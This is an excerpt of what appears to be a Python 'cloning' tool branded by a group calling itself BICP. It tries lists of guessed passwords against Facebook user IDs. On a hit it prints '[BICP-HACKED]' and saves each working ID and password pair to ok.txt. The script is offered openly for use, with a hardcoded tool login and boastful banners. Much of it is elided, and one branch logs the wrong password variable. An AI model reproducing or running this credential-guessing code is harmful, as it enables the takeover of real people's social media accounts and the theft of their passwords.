...
\x1b[1;92m➣ NAME :  💗 BICP💗
\x1b[1;91m➣ CYBER NAME :  💣 BNAGLADESH ISMALIC CYBER PROTECTOR💣
\x1b[1;93m➣ WHATSAPP NO :  👬 Nai👬
\x1b[1;95m➣ WARNING :  ⚠️ DON'T SEE PRON 🥵
\x1b[1;96m➣ FUNNY LINE :  SINGLE GIRLS ADD ME
\x1b[1;93mWARNING : ENJOY FREE CLONING CREDIT TO BICP TEAM
...
\x1b[1;95m➣ FACEBOOK :  BICP.Team.Help.Zone
...
def tool_login():
    ...
    if username =="BICP":
        ...
        if passwordss =="BICP":
            ...
            print 
            print 
            print ("[✓] Username : BICP (Correct)")
            print ("[✓] Password : BICP (Correct)")
            time.sleep(1)
            print('')
...
def menu_select():
    ...
    if option =="1":
        ...
        os.system("clear")
        print 
        ham("\033[1;32m[✓] BICP Tool Has Been Updated Successfully\033[0;97m")
        time.sleep(1)
        ...
        os.system("rm -rf .login.txt")
        time.sleep(1)
        print("\r\033[1;32m[✓]BICP Logged Out Successfully\033[0;97m")
        os.system("exit")
    else:
        print("[!] Please Select a Valid Option")
        menu_select()
		...
		try:
		    ...
		    if 'www.facebook.com' in d['error_msg']:
		    	...
		    	if "access_token" in d:
		            print("\x1b[1;92m[BICP-HACKED] \033[1;30m"+uid+" | "+pass1+"\x1b[1;0m")
		            ok=open("ok.txt","a")
		            ok.write(uid+" | "+pass1+"\n")
		            ok.close()
		            oks.append(uid)
		            ...
		            if 'www.facebook.com' in d['error_msg']:
		                ...
		                if 'access_token' in d:
		                    print("\x1b[1;92m[BICP-HACKED] \033[1;30m"+uid+" | "+pass2+"\x1b[1;0m")
		                    ok=open("ok.txt","a")
		                    ok.write(uid+" | "+pass2+"\n")
		                    ok.close()
		                    oks.append(uid)
		                    ...
		                    if 'www.facebook.com' in d['error_msg']:
		                        ...
		                        if 'access_token' in d:
		                            print(" \x1b[1;92m[BICP-HACKED] \033[1;30m"+uid+" | "+pass3+"\x1b[1;0m")
		                            ok=open("ok.txt","a")
		                            ok.write(uid+" | "+pass3+"\n")
		                            ok.close()
		                            oks.append(uid)
		                            ...
		                            if 'www.facebook.com' in d['error_msg']:
		                                ...
		                                if 'access_token' in d:
		                                    print("\x1b[1;92m[BICP-HACKED] \033[1;30m"+uid+" | "+pass4+"\x1b[1;0m")
		                                    ok=open("ok.txt","a")
		                                    ok.write(uid+" | "+pass4+"\n")
		                                    ok.close()
		                                    oks.append(uid)
		                                    ...
		                                    if 'www.facebook.com' in d['error_msg']:
		                                        ...
		                                        if 'access_token' in d:
		                                            print("\x1b[1;92m[BICP-HACKED] \033[1;30m"+uid+" | "+pass5+"\x1b[1;0m")
		                                            ok=open("ok.txt","a")
		                                            ok.write(uid+" | "+pass5+"\n")
		                                            ok.close()
		                                            oks.append(uid)
		                                            ...
		                                            if 'www.facebook.com' in d['error_msg']:
		                                                ...
		                                                if 'access_token' in d:
		                                                    ...
		                                                    if 'www.facebook.com' in d['error_msg']:
		                                                        ...
		                                                        if 'access_token' in d:
		                                                            print("\x1b[1;92m[BICP-HACKED] \033[1;30m"+uid+" | "+pass7+"\x1b[1;0m")
		                                                            ok=open("ok.txt","a")
		                                                            ok.write(uid+" | "+pass7+"\n")
		                                                            ok.close()
		                                                            oks.append(uid)
		                                                    ...
		                                                    if 'www.facebook.com' in d['error_msg']:
		                                                        ...
		                                                        if 'access_token' in d:
		                                                            print("\x1b[1;92m[BICP-HACKED] \033[1;30m"+uid+" | "+pass8+"\x1b[1;0m")
		                                                            ok=open("ok.txt","a")
		                                                            ok.write(uid+" | "+pass7+"\n")
		                                                            ok.close()
		                                                            oks.append(uid)
